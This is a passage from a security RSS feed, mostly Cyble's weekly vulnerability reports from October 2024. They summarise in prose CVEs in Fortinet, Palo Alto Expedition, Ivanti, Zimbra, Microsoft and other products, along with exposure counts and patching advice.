We don’t know yet! - and you can follow along as we find out. The fuzzer found a couple of <a href="https://issues.chromium.org/issues/348021995">potential</a> <a href="https://issues.chromium.org/issues/348328060">bugs</a> (currently access restricted) in the accessibility code itself but hasn’t yet explored far enough to discover bugs in Chrome’s fundamental UI. But, at the time of writing, this has only been running on our ClusterFuzz infrastructure for a few hours, and isn’t yet working on our <a href="https://analysis.chromium.org/coverage/p/chromium/file?host=chromium.googlesource.com&amp;project=chromium/src&amp;ref=refs/heads/main&amp;revision=d4e6019588463e5cf95111345e52771c4aaf4b4c&amp;path=//chrome/test/fuzzing/atspi_in_process_fuzzer.cc&amp;platform=fuzz&amp;test_suite_type=any&amp;modifier_id=0">coverage dashboard</a>. If you’d like to follow along, keep an eye on our coverage dashboard as it expands to cover UI code.
</p>
]]></content:encoded>
<pubDate>2024-10-10T12:00:46.411-04:00</pubDate>
</item>
<item>
<title>IT Vulnerability Weekly Report: Cyble Urges Fixes for Fortinet, Palo Alto &amp; More</title>
<link>https://cyble.com/blog/cyble-urges-fixes-for-fortinet-palo-alto-more/</link>
<guid>https://cyble.com/blog/cyble-urges-fixes-for-fortinet-palo-alto-more/</guid>
<content:encoded><![CDATA[
<p><img alt="Vulnerability" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/10/Cyble-Blogs-IT-Vulnerability-3-1.png" tabindex="0" title="IT Vulnerability Weekly Report: Cyble Urges Fixes for Fortinet, Palo Alto &amp; More 2" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Overview</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble Research and Intelligence Labs (CRIL) investigated 27 vulnerabilities during the week of October 9-15 and identified 11 as high-priority fixes for security teams.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble researchers also observed 14 vulnerability exploits discussed on <a href="https://cyble.com/knowledge-hub/what-is-the-dark-web/">dark web</a> and cybercrime forums, raising the likelihood that those vulnerabilities will be exploited more frequently.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Of the vulnerabilities highlighted by Cyble threat researchers, two are being actively exploited by state-sponsored <a href="https://cyble.com/knowledge-hub/cyber-threat-actor-and-types/">threat actors</a>, and five could be chained together to hijack Palo Alto Networks firewalls.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Among the vulnerabilities investigated by Cyble researchers this week, Cyble’s <a href="https://odin.io/">Odin</a> vulnerability exposure search tool detected 427,000 vulnerable Fortinet devices exposed to the internet after CVE-2024-23113, a 9.8-severity Format String Vulnerability, was <a href="https://www.cisa.gov/news-events/alerts/2024/10/09/cisa-adds-three-known-exploited-vulnerabilities-catalog">added</a> to CISA’s Known Exploited Vulnerabilities catalog on Oct. 9.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Other vulnerable web-facing assets detected by Cyble Odin include<span style="margin: 0px; padding: 0px;"> 87,000 exposed GitLab and <a href="https://cyble.com/blog/active-exploitation-of-saml-vulnerability-cve-2024-45409-detected-by-cyble-sensors/" rel="noopener" target="_blank">SAML</a> instances, 35,000 vulnerable <a href="https://cyble.com/blog/zimbra-remote-code-execution-vulnerability-under-active-attack/" rel="noopener" target="_blank">Zimbra</a> servers, 7,800 vulnerable <a href="https://cyble.com/blog/cisa-issues-urgent-advisory-on-critical-vulnerabilities-in-ivanti-products/" rel="noopener" target="_blank">Ivanti Cloud Services Appliances</a>, and 2,400 exposed <a href="https://cyble.com/blog/critical-vulnerability-in-veeam-products-exploited-by-ransomware-gangs/" rel="noopener" target="_blank">Veeam Backup</a> instances (chart below). Cyble issued separate advisories regarding several of those vulnerabilities </span>(see links).</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:table --></p>
<figure class="wp-block-table">
<table class="has-fixed-layout">
<tbody>
<tr>
<td><strong>Product &amp; Vulnerability</strong></td>
<td><strong>Internet Exposures</strong></td>
</tr>
<tr>
<td>Fortinet (CVE-2024-23113)</td>
<td>427,134</td>
</tr>
<tr>
<td>Gitlab EE (CVE-2024-9164)</td>
<td>87,402</td>
</tr>
<tr>
<td>SAML Toolkits (CVE-2024-45409)</td>
<td>87,042</td>
</tr>
<tr>
<td>Zimbra Web Client (CVE-2024-45519)</td>
<td>35,064</td>
</tr>
<tr>
<td>Ivanti CSA (CVE2024-9380, CVE-2024-9379)</td>
<td>7,831</td>
</tr>
<tr>
<td>Veeam Backup &amp; Replication (CVE-2024- 40711)</td>
<td>2,408</td>
</tr>
</tbody>
</table>
</figure>
<p><!-- /wp:table --></p>
<p><!-- wp:paragraph --></p>
<p>Below are the 11 high-priority vulnerabilities and 14 dark web exploits in detail.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">The Top IT Vulnerabilities</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>These 11 vulnerabilities should be prioritized by security teams, according to Cyble researchers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088"><strong>CVE-2024-30088</strong></a>: A high-severity privilege escalation vulnerability in Windows that enables attackers to escalate their privileges to the SYSTEM level, giving them significant control over compromised devices. Researchers disclosed that the Iranian state-sponsored hacking group APT34, aka OilRig, is exploiting the CVE-2024-30088 flaw to elevate their privileges on compromised devices in their new campaigns targeting government and critical infrastructure entities in the United Arab Emirates and the Gulf region.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9486"><strong>CVE-2024-9486</strong></a>: This critical vulnerability affects Kubernetes Image Builder, a specialized tool designed for creating virtual machine images that are optimized for Kubernetes environments. The flaw impacts versions &lt;= v0.1.37, where default credentials are enabled during the image build process. The credentials can be used to gain root access. Kubernetes clusters are only affected if their nodes use VM images created via the Image Builder project with its Proxmox provider.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-38178"><strong>CVE-2024-38178</strong></a>: A high-severity type confusion vulnerability that impacts Internet Explorer. Recently, government agencies disclosed that ScarCruft, a state-sponsored cyber-espionage threat actor known for targeting systems in South Korea and Europe, launched a new campaign dubbed "Code on Toast." This campaign leveraged toast pop-up ads to perform zero-click malware infections by exploiting the CVE-2024-38178 vulnerability.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40711"><strong>CVE-2024-40711</strong></a><strong>:</strong> This critical deserialization of untrusted data vulnerability impacts Veeam Backup &amp; Replication (VBR) and can lead to unauthenticated remote code execution (RCE). Recently, researchers discovered that Akira and Fog ransomware groups are now exploiting the vulnerability to gain RCE on vulnerable servers.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9164"><strong>CVE-2024-9164</strong></a>: This critical vulnerability impacts GitLab Enterprise Edition (EE). The flaw allows unauthorized users to trigger Continuous Integration/Continuous Delivery (CI/CD) pipelines on any branch of a repository. An attacker capable of bypassing branch protections could potentially perform code execution or gain access to sensitive information.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9463"><strong>CVE-2024-9463</strong></a><strong>, </strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9464"><strong>CVE-2024-9464</strong></a><strong>, </strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9465"><strong>CVE-2024-9465</strong></a><strong>, </strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9466"><strong>CVE-2024-9466</strong></a><strong>, </strong><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9467"><strong>CVE-2024-9467</strong></a>: These vulnerabilities – the first of which carries a 9.9 severity rating – impact Palo Alto Networks Expedition, a migration tool designed to facilitate the transition of network configurations from various vendors to Palo Alto Networks PAN-OS. This tool is particularly useful for organizations looking to switch from competitors, as it helps streamline the migration process and reduce the time and effort required for configuration changes. The flaws can be chained to let attackers hijack PAN-OS firewalls and are being discussed by threat actors (see dark web section below). CVE-2024-9463 and CVE-2024-9464 are OS command injection vulnerabilities allowing an unauthenticated attacker to run arbitrary OS commands as root in Expedition. Upon successful exploitation, the vulnerabilities may result in the disclosure of usernames, cleartext passwords, device configurations, and device API keys of PAN-OS <a href="https://cyble.com/knowledge-hub/what-is-firewall/">firewalls</a>.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-9465 is an SQL injection vulnerability that allows an unauthenticated attacker to reveal Expedition database contents, such as password hashes, usernames, device configurations, and device API keys. CVE-2024-9466 is a vulnerability in cleartext storage of sensitive information that allows an authenticated attacker to reveal firewall usernames, passwords, and API keys generated using those credentials. CVE-2024-9467 is a reflected XSS vulnerability allowing attackers to execute malicious JavaScript code in the context of an authenticated Expedition user’s browser.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading"><strong>Dark Web and Cybercrime Forum Exploits</strong></h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble researchers also observed numerous vulnerability exploits discussed in cybercrime forums and on Telegram channels. These vulnerabilities could become increasingly exploited because of these <a href="https://cyble.com/knowledge-hub/what-is-the-dark-web/">dark web</a> activities, meriting higher priority attention from security teams.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-30052:</strong> A remote code execution (RCE) vulnerability affecting Microsoft Visual Studio, particularly versions 2022 prior to 17.8.11 and certain configurations of Visual Studio 2019.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-20353:</strong> A critical vulnerability identified in Cisco's Adaptive Security Appliance (ASA) and Firepower Threat Defense (FTD) software, which allows for a Denial-of-Service (DoS) attack. The vulnerability enables an attacker to send crafted HTTP requests that can cause the device to reload unexpectedly, leading to service disruptions.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-7479:</strong> A critical security vulnerability affecting TeamViewer's Remote Client and Remote Host products for Windows. The vulnerability arises from improper verification of cryptographic signatures during the installation of VPN drivers, allowing attackers with local, unprivileged access to escalate their privileges and execute arbitrary code.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-7481:</strong> A critical security vulnerability affecting TeamViewer's Remote Client and Remote Host products for Windows. The vulnerability arises from improper verification of cryptographic signatures during the installation of printer drivers, allowing attackers with local, unprivileged access to escalate their privileges and execute arbitrary code.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-42640:</strong> A critical vulnerability affecting the angular-base64-upload library, specifically in versions prior to v0.1.21. This vulnerability allows remote code execution (RCE) through the demo/server.php endpoint, enabling attackers to upload arbitrary files to the server.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-9464:</strong> A critical OS command injection vulnerability found in Palo Alto Networks' Expedition tool, which allows an attacker to execute arbitrary OS commands as root, potentially leading to the disclosure of sensitive information.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-45409:</strong> A critical vulnerability affecting the Ruby-SAML and OmniAuth-SAML libraries. This flaw allows unauthenticated attackers to bypass Security Assertion Markup Language (SAML) authentication mechanisms by exploiting weaknesses in the signature verification process of SAML responses.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-45200:</strong> A recently identified vulnerability affecting Mario Kart 8 Deluxe, specifically versions prior to 3.0.3. This security flaw, dubbed "KartLANPwn," is classified as a stack-based buffer overflow that occurs during the local multiplayer (LAN/LDN) gameplay mode, which allows remote attackers on the same local network to execute arbitrary code or cause a denial-of-service (DoS) condition on the victim's console without requiring user interaction or elevated privileges.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-6769:</strong> This vulnerability affects multiple versions of Microsoft Windows, including Windows 10, Windows 11, and various Windows Server editions. It exploits a combination of DLL Hijacking and Activation Cache Poisoning, allowing an attacker to elevate privileges from a medium to a high-integrity process without triggering a User Account Control (UAC) prompt.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-38816:</strong> A high-severity path traversal vulnerability was discovered in the Spring Framework and VMWare Tanzu Spring platform, affecting multiple versions. This vulnerability allows attackers to exploit improper handling of static resources, potentially gaining unauthorized access to sensitive files on the server.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-5830:</strong> A critical security vulnerability was discovered in Google Chrome's V8 JavaScript engine, affecting versions prior to 126.0.6478.54. This vulnerability is a type of confusion bug that an attacker can exploit to execute arbitrary code within the Chrome renderer sandbox simply by enticing a victim to visit a malicious website.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-20404:</strong> A medium severity vulnerability affecting the webbased management interface of Cisco Finesse. The issue comes from insufficient validation of user-supplied input for specific HTTP requests, which allows remote attackers to conduct Server-Side Request Forgery (SSRF) attacks on an affected system.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-0044:</strong> A high-severity vulnerability affecting Android versions 12, 12L, 13, and 14 and is present in the createSessionInternal function of the PackageInstallerService.java, allowing attackers to execute a "run-as any app" attack. This exploit can lead to local escalation of privileges without requiring user interaction, primarily due to improper input validation.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p><strong>CVE-2024-45519</strong>: A critical Remote Code Execution (RCE) vulnerability was discovered in the postjournal service of the Zimbra Collaboration Suite, a widely used email and collaboration platform.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Cyble Recommendations</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>To protect against these vulnerabilities and exploits, organizations should implement the following best practices:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>To mitigate vulnerabilities and protect against exploits, regularly update all software and hardware systems with the latest patches from official vendors.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Develop a comprehensive patch management strategy that includes inventory management, patch assessment, testing, deployment, and verification. Automate the process where possible to ensure consistency and efficiency.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Divide your network into distinct segments to isolate critical assets from less secure areas. Use firewalls, VLANs, and access controls to limit access and reduce the <a href="https://cyble.com/solutions/attack-surface-management/">attack surface</a> exposed to potential <a href="https://cyble.com/knowledge-hub/what-are-cyber-threats/">threats</a>.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Create and maintain an <a href="https://cyble.com/knowledge-hub/what-is-incident-response/">incident response</a> plan that outlines procedures for detecting, responding to, and recovering from security incidents. Regularly test and update the plan to ensure its effectiveness and alignment with current threats.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Implement comprehensive monitoring and logging solutions to detect and analyze <a href="https://cyble.com/knowledge-hub/what-is-a-data-breach/">suspicious activities</a>. Use SIEM (Security Information and Event Management) systems to aggregate and correlate logs for real-time threat detection and response.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Subscribe to security advisories and alerts from official vendors, CERTs, and other authoritative sources. Regularly review and assess the impact of these alerts on your systems and take appropriate actions.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Conduct regular vulnerability assessment and penetration testing (VAPT) exercises to identify and remediate vulnerabilities in your systems. Complement these exercises with periodic security audits to ensure compliance with security policies and standards.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Conclusion</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>These vulnerabilities highlight the urgent need for security teams to prioritize patching critical vulnerabilities in major products. With increasing discussions of these exploits on <a href="https://cyble.com/solutions/dark-web-monitoring/">dark web</a> forums, organizations must stay vigilant and proactive. Implementing strong security practices is essential to protect sensitive data and maintain system integrity.</p>
<p><!-- /wp:paragraph --></p>
<p>The post <a href="https://cyble.com/blog/cyble-urges-fixes-for-fortinet-palo-alto-more/" rel="nofollow">IT Vulnerability Weekly Report: Cyble Urges Fixes for Fortinet, Palo Alto &#038; More</a> appeared first on <a href="https://cyble.com" rel="nofollow">Cyble</a>.</p>
]]></content:encoded>
<pubDate>Fri, 18 Oct 2024 08:37:55 +0000</pubDate>
</item>
<item>
<title>Weekly IT Vulnerability Report: Cyble Urges Fixes for Ivanti, Microsoft Dark Web Exploits</title>
<link>https://cyble.com/blog/weekly-it-vulnerability-report-cyble-urges-fixes-for-ivanti-microsoft-dark-web-exploits/</link>
<guid>https://cyble.com/blog/weekly-it-vulnerability-report-cyble-urges-fixes-for-ivanti-microsoft-dark-web-exploits/</guid>
<content:encoded><![CDATA[
<p><img alt="Cyble-Blogs-Weekly-Vulnerability" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" height="600" src="https://cyble.com/wp-content/uploads/2024/10/Cyble-Blogs-Weekly-Vulnerability.png" tabindex="0" title="Weekly IT Vulnerability Report: Cyble Urges Fixes for Ivanti, Microsoft Dark Web Exploits 8" width="1200" /></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Key Takeaways</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li>Cyble researchers have identified high-priority vulnerabilities in products from Ivanti, Microsoft, Qualcomm, Zimbra, and the Common Unix Printing System (CUPS).</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Microsoft’s Patch Tuesday included five new zero-day vulnerabilities, two of which are being actively exploited – and Cyble researchers have observed threat actors discussing the other three zero-days on cybercrime forums.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li>Cyble also detected 14 vulnerability exploits discussed on dark web forums, suggesting that they may soon be under attack, if not already.</li>
<p><!-- /wp:list-item --></ul>
<p><!-- /wp:list --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Overview</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble Research and Intelligence Labs (CRIL) investigated 22 vulnerabilities during the week of Oct. 2-8 and identified six products that security teams should prioritize for patching and mitigation.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Additionally, Cyble researchers detected 14 vulnerabilities and exploits shared on cybercrime forums that security analysts should also prioritize – including the three Microsoft <a href="https://cyble.com/knowledge-hub/zero-day-exploit/">zero-days</a> not yet under active exploitation.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble’s weekly IT vulnerability report covering the period of Oct. 2-8 also offered best practices that all security teams should follow.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Top IT Vulnerabilities This Week</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CRIL researchers identified eight vulnerabilities in six products that security teams should prioritize; three affect Ivanti Cloud Services Appliances (CSA).</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">CVE-2024-9379, CVE-2024-9380, CVE-2024-9381: Ivanti CSA</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>These three critical vulnerabilities impact Ivanti Cloud Services Appliance (CSA), an internet appliance designed to facilitate secure communication and management of devices over the internet. It serves as a bridge between the core server and managed devices, enabling them to communicate even when they are behind firewalls or using proxies.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CVE-2024-9379 is an SQL injection flaw that a remote authenticated attacker with admin privileges can trigger. CVE-2024-9380 is an OS command injection vulnerability that allows a remote authenticated attacker with admin privileges to achieve remote code execution. CVE-2024-9381 is a path traversal vulnerability that allows a remote authenticated attacker with admin privileges to bypass restrictions. In a recent advisory, Ivanti <a href="https://www.ivanti.com/blog/october-2024-security-update">disclosed</a> attackers' exploitation of CVE-2024- 9379, CVE-2024-9380, or CVE-2024-9381, chained with CVE-2024-8963. CISA also issued an <a href="https://cyble.com/blog/cisa-issues-urgent-advisory-on-critical-vulnerabilities-in-ivanti-products/">advisory</a> urging security teams to patch the flaws.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">CVE-2024-47176: CUPS</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This vulnerability impacts the Common Unix Printing System, an open-source printing system designed for Linux and other Unix-like operating systems, providing a standardized framework for managing and controlling printers, enabling computers to act as print servers that accept print jobs from client machines, process them, and send them to the appropriate printer. Recently, researchers disclosed that threat actors can exploit vulnerabilities to launch distributed denial-of-service (DDoS) attacks with a 600x amplification factor. Under certain conditions, attackers can chain the set of vulnerabilities in multiple components of CUPS to execute arbitrary code remotely on vulnerable machines. Cyble researchers had <a href="https://cyble.com/blog/weekly-it-vulnerability-report-cyble-urges-fixes-for-nvidia-adobe-cups/">warned</a> about the CUPS vulnerability the previous week and reiterated the warning as new exploits emerged.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">CVE-2024-45519: Zimbra</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This <a href="https://cyble.com/blog/zimbra-remote-code-execution-vulnerability-under-active-attack/">9.8-severity vulnerability</a> impacts Zimbra Collaboration Suite (ZCS), an integrated communication and collaboration platform designed for businesses and organizations, integrating various tools for email, calendaring, contact management, and document sharing. Unauthenticated users can exploit the flaw to execute commands. Recently, researchers disclosed that attackers are actively exploiting the RCE vulnerability that can be triggered simply by sending specially crafted emails with commands to execute in the CC field, which are then executed when the postjournal service processes the email. Cyble researchers also observed multiple discussions of the vulnerability on the <a href="https://cyble.com/knowledge-hub/what-is-the-dark-web/">dark web</a> (see Dark Web section below).</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">CVE-2024-43047: Qualcomm</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>This zero-day vulnerability in the Digital Signal Processor (DSP) service that impacts dozens of Qualcomm chipsets can also be leveraged in spyware campaigns targeting Android devices. Cyble published a <a href="https://cyble.com/blog/oems-are-urged-to-address-vulnerabilities-in-device-communication/">report</a> and has highlighted the exploitation of CVE-2024-43047 in targeted attacks. OEMs are encouraged to apply the provided patches immediately. Users concerned about their devices should reach out to manufacturers for specific patch details.&nbsp;</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading {"level":3} --></p>
<h3 class="wp-block-heading">CVE-2024-43572 and CVE-2024-43573: Microsoft</h3>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Microsoft’s October 2024 <a href="https://msrc.microsoft.com/update-guide/releaseNote/2024-Oct">Patch Tuesday</a> included security updates for 118 flaws, including five publicly disclosed zero-days, two of which are being actively exploited: <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43572">CVE-2024-43572</a>, a Remote Code Execution vulnerability in Windows Management Console, and <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43573">CVE-2024-43573</a>, a spoofing vulnerability in the Windows MSHTML Platform.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>Cyble researchers observed cybercrime exploit discussions on the other zero days reported by Microsoft (see Dark Web section below): CVE-2024-38200, a Microsoft Office Spoofing vulnerability; CVE-2024-29050, a Remote Code Execution (RCE) flaw in Windows 10 for x32- and x64-based Systems; and CVE-2024-6769, a Privilege Escalation vulnerability in Windows 10, Windows 11 - 10.0.0, Windows Server 2016, Windows Server 2019 - 10.0.0.</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:heading --></p>
<h2 class="wp-block-heading">Dark Web and Cybercrime Forum Exploits</h2>
<p><!-- /wp:heading --></p>
<p><!-- wp:paragraph --></p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:paragraph --></p>
<p>CRIL observed multiple Telegram channels and cybercrime forums sharing or discussing exploits weaponizing different vulnerabilities. The vulnerabilities under discussion included:</p>
<p><!-- /wp:paragraph --></p>
<p><!-- wp:list --></p>
<ul class="wp-block-list"><!-- wp:list-item --></p>
<li><strong>CVE-2024-38200:</strong> A critical vulnerability affecting multiple versions of Microsoft Office that arises from improper handling of certain document properties within Microsoft Office applications. It could potentially expose sensitive information such as NTLM hashes.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-29050:</strong> A Windows Cryptographic Services Remote Code Execution (RCE) vulnerability that arises from truncation errors that occur when a primitive data type is cast to a smaller size, resulting in potential data loss during conversion.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-6769:</strong> A vulnerability affecting multiple versions of Microsoft Windows, including Windows 10, Windows 11, and various Windows Server editions. The vulnerability exploits a combination of DLL Hijacking and Activation Cache Poisoning, allowing an attacker to elevate privileges from a medium to a high-integrity process without triggering a User Account Control (UAC) prompt.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-7479:</strong> A critical security vulnerability affecting TeamViewer's Remote Client and Remote Host products for Windows. The vulnerability arises from improper verification of cryptographic signatures during the installation of VPN drivers, allowing attackers with local, unprivileged access to escalate their privileges and execute arbitrary code.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-7481:</strong> A critical security vulnerability affecting TeamViewer's Remote Client and Remote Host products for Windows. The vulnerability arises from improper verification of cryptographic signatures during the installation of printer drivers, allowing attackers with local, unprivileged access to escalate their privileges and execute arbitrary code.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-36435</strong>: A critical vulnerability in the Baseboard Management Controller (BMC) firmware of several Supermicro enterprise products. The vulnerability allows unauthenticated attackers to exploit a buffer overflow, leading to remote code execution (RCE).</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-38816</strong>: A high-severity path traversal vulnerability discovered in the Spring Framework and VMWare Tanzu Spring platform, affecting multiple versions. This vulnerability allows attackers to exploit improper handling of static resources, potentially gaining unauthorized access to sensitive files on the server.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-45519:</strong> Proofs of Concept (PoCs) of this widely reported Zimbra vulnerability are shared on multiple Telegram channels. It is a critical Remote Code Execution (RCE) vulnerability that was discovered in the postjournal service of the Zimbra Collaboration Suite, a widely used email and collaboration platform.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-45409:</strong> A critical vulnerability affecting the Ruby SAML and OmniAuth SAML libraries. This flaw allows unauthenticated attackers to bypass Security Assertion Markup Language (SAML) authentication mechanisms by exploiting weaknesses in the signature verification process of SAML responses. Cyble honeypot sensors detected active attacks on this vulnerability.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-26304:</strong> A critical vulnerability affecting HPE Aruba Devices, classified as an unauthenticated buffer overflow vulnerability in the L2/L3 Management Service accessed via the PAPI Protocol. The vulnerability allows attackers to send specially crafted packets to the PAPI UDP port (8211), potentially enabling them to execute arbitrary code as a privileged user on the affected system.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
<li><strong>CVE-2024-5830:</strong> A critical security vulnerability was discovered in Google Chrome's V8 JavaScript engine, affecting versions prior to 126.0.6478.54. This vulnerability is a <a>type</a> confusion bug, which an attacker can exploit to execute arbitrary code within the Chrome renderer sandbox simply by enticing a victim to visit a malicious website.</li>
<p><!-- /wp:list-item --></p>
<p><!-- wp:list-item --></p>
